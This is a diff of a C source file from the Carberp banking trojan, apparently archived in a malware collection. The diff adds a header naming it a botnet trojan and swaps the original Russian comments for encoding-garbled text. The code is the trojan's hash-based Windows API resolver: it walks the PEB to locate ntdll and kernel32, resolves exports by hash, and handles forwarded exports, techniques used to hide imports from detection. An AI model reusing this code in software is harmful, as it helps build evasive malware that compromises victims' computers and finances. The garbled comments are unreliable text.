@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "Getapi.h"
@@ -12,7 +23,7 @@
 //
 //				Global Var
 
-	 PVOID ImageNtdll;		// База нтдлл
+	 PVOID ImageNtdll;		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 //
 //
@@ -36,7 +47,7 @@ HMODULE GetKernel32(void)
 }
 
 //
-//	CallBack для перечесления модулей.
+//	CallBack пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 //
 VOID NTAPI LdrEnumCallBack ( IN PLDR_DATA_TABLE_ENTRY DataTableEntry,IN PVOID Context, IN OUT BOOLEAN *StopEnumeration )
 {
@@ -131,8 +142,8 @@ HMODULE GetDllBaseByPEB( DWORD dwDllHash )
 
 LPVOID GetForvardedProc(PCHAR Name)
 {
-	// Функция обработки переназначения экспорта
-	// На входе должна быть строка DllName.ProcName или DllName.#ProcNomber
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ DllName.ProcName пїЅпїЅпїЅ DllName.#ProcNomber
 	if (Name == NULL)
  		return NULL;
 
@@ -143,16 +154,16 @@ LPVOID GetForvardedProc(PCHAR Name)
 	if (NameStr == NULL)
 		return NULL;
 
-	// Собираем имя библиотеки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	m_memcpy(DLLName, Name, NameStr - Name);
 
 	m_lstrcat(DLLName, ".dll");
 
-	// определяем имя функции
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	NameStr++;
 	if (*NameStr == '#')
 	{
-		// Имя является номером функции
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		NameStr++;
 		DWORD OrdNomber = m_atoi(NameStr);
 		return GetProcAddressEx(DLLName, 0, OrdNomber);
@@ -164,26 +175,26 @@ LPVOID GetForvardedProc(PCHAR Name)
 
 LPVOID GetApiAddr(HMODULE Module, DWORD ProcNameHash)
 {
-	/*----------- Функция возвращает адрем функции по её названию -----------*/
+	/*----------- пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ -----------*/
 
-    // Получаем адрес дополнительных PE заголовков
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PE пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PIMAGE_OPTIONAL_HEADER poh  = (PIMAGE_OPTIONAL_HEADER)( (char*)Module + ( (PIMAGE_DOS_HEADER)Module)->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
 
-	// Получаем адрес таблицы експорта
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module,	poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
 
     DWORD DataSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
 
-	int Ordinal = 0; // Норем необходимой нам функции
+	int Ordinal = 0; // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if ( HIWORD(ProcNameHash) == 0 )
 	{
-		// Ищем функцию по её номеру
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		Ordinal = (LOWORD(ProcNameHash)) - Table->Base;
 	}
 	else
 	{
-		// Ищем функцию по номеру
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PDWORD NamesTable  = (DWORD*)RVATOVA(Module, Table->AddressOfNames );
 		PWORD  OrdinalTable =  (WORD*)RVATOVA(Module, Table->AddressOfNameOrdinals);
 
@@ -197,22 +208,22 @@ LPVOID GetApiAddr(HMODULE Module, DWORD ProcNameHash)
 				Ordinal = *OrdinalTable;
 				break;
 			}
-			// Увеличиваем позицию в таблице
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			NamesTable++;
 			OrdinalTable++;
 		}
 	}
 
-	// не нашли номер
+	// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Ordinal == 0)
 		return NULL;
 
-	// Определяем адрес функции
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PDWORD AddrTable  = (PDWORD)RVATOVA(Module, Table->AddressOfFunctions);
 	DWORD RVA		  = AddrTable[Ordinal];
 	DWORD Ret		  = (DWORD)RVATOVA(Module, RVA );
 
-	// проверяем на переназначение экспорта
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Ret > (DWORD)Table && (Ret - (DWORD)Table < DataSize))
 		Ret = (DWORD)GetForvardedProc((PCHAR)Ret);
 
@@ -225,7 +236,7 @@ LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
 
 //-----------------------------------------------------------------------------
 
-	// Названия используемых библиотек
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	//char kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
 	const static char advapi32_dll[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
 	const static char user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',0};
@@ -287,13 +298,13 @@ LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
 			DllName = (PCHAR)ssl3_dll;break;
 			
 		case(12):
-			DllName = (PCHAR)winmm_dll;break;// для вырубания звука
+			DllName = (PCHAR)winmm_dll;break;// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			
 		case(13):
-			DllName = (PCHAR)cabinet_dll;break;//для архивирования
+			DllName = (PCHAR)cabinet_dll;break;//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			
 		case(14):
-			DllName = (PCHAR)opera_dll;break;//для оперы
+			DllName = (PCHAR)opera_dll;break;//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			
 		case(15):
 			DllName = (PCHAR)gdi32_dll; break;
@@ -318,11 +329,11 @@ LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
 			Module = (HMODULE)pLoadLibraryA(DllName);
 	}
 
-	/*LPVOID ret = (LPVOID)0x00000000; так было ранее
+	/*LPVOID ret = (LPVOID)0x00000000; пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	if (hModule != NULL)
 		ret = GetApiAddr( hModule, dwProcNameHash );*/
-/***/ // так стало
+/***/ // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	if (dwProcNameHash == 0)
 		return Module;
@@ -342,9 +353,9 @@ BOOL InitializeImportCurrentModule();
 BOOL WINAPI InitializeAPI()
 {
   BOOL bRet;
-	InitializeNTDLL();	//	Инициализация нтдлл и сохранение ее адреса
+	InitializeNTDLL();	//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-	bRet = InitializeImportCurrentModule();	//	настройка импорта текущей длл
+	bRet = InitializeImportCurrentModule();	//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	
 	return bRet;
 }
@@ -369,8 +380,8 @@ BOOL IsImagePE(PVOID Image)
 BOOL IsNTDLL(PVOID Image)
 {
 	//
-	//	Просто проверяет содержит ли указанный образ длл/ехе такие експлортируемые функ:
-	//	Если да то это нтдлл.
+	//	пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ/пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ:
+	//	пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 	// 
 	if ( GetApiAddr((HMODULE)Image,0x3D9AC241) )
 	if ( GetApiAddr((HMODULE)Image,0x323C2875) )
